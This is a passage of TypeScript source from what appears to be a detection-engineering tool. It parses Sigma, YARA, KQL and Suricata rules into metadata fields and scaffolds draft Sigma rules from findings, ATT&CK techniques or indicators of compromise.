    if (mTitle) fields.push({ key: "title", value: mTitle[1] });
    const mId = rule.match(/^id:\s*(.+)$/m);
    if (mId) fields.push({ key: "id", value: mId[1] });
    const mStatus = rule.match(/^status:\s*(.+)$/m);
    if (mStatus) fields.push({ key: "status", value: mStatus[1] });
    const mLevel = rule.match(/^level:\s*(.+)$/m);
    if (mLevel) fields.push({ key: "level", value: mLevel[1] });
    const mProduct = rule.match(/product:\s*(.+)$/m);
    if (mProduct) fields.push({ key: "logsource.product", value: mProduct[1] });
    const mCategory = rule.match(/category:\s*(.+)$/m);
    if (mCategory) fields.push({ key: "logsource.category", value: mCategory[1] });
    const mCondition = rule.match(/condition:\s*(.+)$/m);
    if (mCondition) fields.push({ key: "condition", value: mCondition[1] });
    const tagsMatch = rule.match(/tags:\s*\n((?:\s+- .+\n?)*)/);
    if (tagsMatch) {
      const tags = tagsMatch[1].match(/- (.+)/g)?.map(t => t.replace(/^-\s*/, "").trim()) ?? [];
      fields.push({ key: "tags", value: tags.join(", ") || "—" });
    }
    const mDesc = rule.match(/^description:\s*(.+)$/m);
    if (mDesc) fields.push({ key: "description", value: mDesc[1] });
    const mAuthor = rule.match(/^author:\s*(.+)$/m);
    if (mAuthor) fields.push({ key: "author", value: mAuthor[1] });
  } else if (fmt === "yara") {
    const mName = rule.match(/^\s*rule\s+(\w+)/m);
    if (mName) fields.push({ key: "rule name", value: mName[1] });
    const metas = rule.match(/^\s+(\w+)\s*=\s*"([^"]*)"$/gm);
    if (metas) metas.forEach((m) => {
      const p = m.match(/^\s+(\w+)\s*=\s*"([^"]*)"$/);
      if (p) fields.push({ key: `meta.${p[1]}`, value: p[2] });
    });
    const strings = rule.match(/^\s+\$(\w+)\s*=\s*"([^"]*)"/gm);
    if (strings) strings.forEach((s) => {
      const p = s.match(/^\s+\$(\w+)\s*=\s*"([^"]*)"/);
      if (p) fields.push({ key: `string.${p[1]}`, value: p[2] });
    });
    const cMatch = rule.match(/condition:\s*(.+?)$/m);
    if (cMatch) fields.push({ key: "condition", value: cMatch[1].trim() });
  } else if (fmt === "kql") {
    const tableMatch = rule.match(/^(\w+)/);
    if (tableMatch && !/^(let|\/\/)/i.test(tableMatch[1])) fields.push({ key: "table", value: tableMatch[1] });
    const wheres = rule.match(/\|\s*where\s+(.+?)(?=\s*\|)/gi);
    if (wheres) wheres.forEach((w) => fields.push({ key: "filter", value: w.replace(/^\|\s*where\s+/i, "").trim() }));
    const projects = rule.match(/\|\s*project\s+(.+?)(?=\s*\|)/gi);
    if (projects) projects.forEach((p) => fields.push({ key: "project", value: p.replace(/^\|\s*project\s+/i, "").trim() }));
    const hasOps = rule.match(/\|\s*\w+/g);
    if (hasOps) fields.push({ key: "operators", value: hasOps.map(o => o.replace("|", "").trim()).filter(Boolean).join(", ") });
  } else if (fmt === "suricata") {
    const head = rule.match(/^(alert|drop|pass|reject)\s+(\w+)\s+(\S+)\s+(\S+)\s+(->|<>)\s+(\S+)\s+(\S+)/i);
    if (head) {
      fields.push({ key: "action", value: head[1] });
      fields.push({ key: "protocol", value: head[2] });
      fields.push({ key: "source", value: `${head[3]}:${head[4]}` });
      fields.push({ key: "direction", value: head[5] });
      fields.push({ key: "destination", value: `${head[6]}:${head[7]}` });
    }
    const msg = rule.match(/msg\s*:\s*"([^"]*)"\s*;/i);
    if (msg) fields.push({ key: "msg", value: msg[1] });
    const sid = rule.match(/sid\s*:\s*(\d+)\s*;/i);
    if (sid) fields.push({ key: "sid", value: sid[1] });
    const rev = rule.match(/rev\s*:\s*(\d+)\s*;/i);
    if (rev) fields.push({ key: "rev", value: rev[1] });
    const classtype = rule.match(/classtype\s*:\s*([\w-]+)\s*;/i);
    if (classtype) fields.push({ key: "classtype", value: classtype[1] });
    const contents = [...rule.matchAll(/content\s*:\s*"([^"]*)"/gi)].map(m => m[1]);
    if (contents.length) fields.push({ key: "content matches", value: contents.join(", ") });
  }
  return fields;
}

/* ── create rule from signal (§5 drives) ────────────────── */

export type RuleSignalSource =
  | { kind: "finding"; label: string; iocs?: string[]; severity: Severity; technique?: string }
  | { kind: "technique"; id: string; name: string; tactic: string }
  | { kind: "ioc"; value: string; type: string };

/** Scaffold a sigma rule body from a case signal (finding / technique / IOC). */
export function ruleFromSignal(src: RuleSignalSource): { name: string; rule: string; tags: string[]; technique?: string } {
  const id = genId().replace(/-/g, "").slice(0, 32);
  const uuid = `${id.slice(0, 8)}-${id.slice(8, 12)}-${id.slice(12, 16)}-${id.slice(16, 20)}-${id.slice(20, 32)}`;
  const level: Severity = src.kind === "finding" ? src.severity : "medium";
  const tokens = src.kind === "finding" ? src.iocs ?? [] : src.kind === "ioc" ? [src.value] : [`${src.id} · ${src.name}`];
  const nameSlug = (() => {
    if (src.kind === "finding") return src.label;
    if (src.kind === "technique") return `${src.id} ${src.name}`;
    return `${src.type} ${src.value}`;
  })();
  const clean = nameSlug.replace(/[:"]/g, " ").replace(/\s+/g, " ").trim();
  const technique = src.kind === "finding" ? src.technique : src.kind === "technique" ? src.id : undefined;
  const tagLines = ["  - detection.lifecycle.draft", ...(technique ? [`  - attack.${technique.toLowerCase()}`] : [])];
  const tagsYaml = tagLines.length ? `tags:
${tagLines.join("\n")}` : "";
  const rule = `title: Detection: ${clean.slice(0, 60)}
id: ${uuid}
status: experimental
description: Rule scaffolded from ${src.kind} signal; refine before validation.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    keywords:
${tokens.slice(0, 8).map((t) => `      - "${t.replace(/"/g, "'").slice(0, 120)}"`).join("\n") || '      - "suspicious"'}
  condition: selection
${tagsYaml}
level: ${level}`;
  return { name: clean.slice(0, 48) || "Unnamed detection", rule, tags: technique ? [technique] : [], technique };
}
